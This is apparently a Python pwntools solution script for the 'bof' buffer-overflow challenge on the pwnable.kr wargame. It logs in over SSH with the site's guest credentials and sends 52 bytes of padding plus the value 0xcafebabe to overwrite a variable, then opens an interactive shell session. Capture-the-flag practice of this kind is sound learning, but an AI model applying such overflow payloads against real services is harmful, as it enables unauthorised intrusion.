from pwn import *

s = ssh(host='pwnable.kr', user="bof", port=2222, password='guest')

p = s.process(["nc", "0", "9000"])

buffer = b"A" * 52
key = p32(0xcafebabe)

pay = buffer + key

p.sendline(pay)
p.interactive()
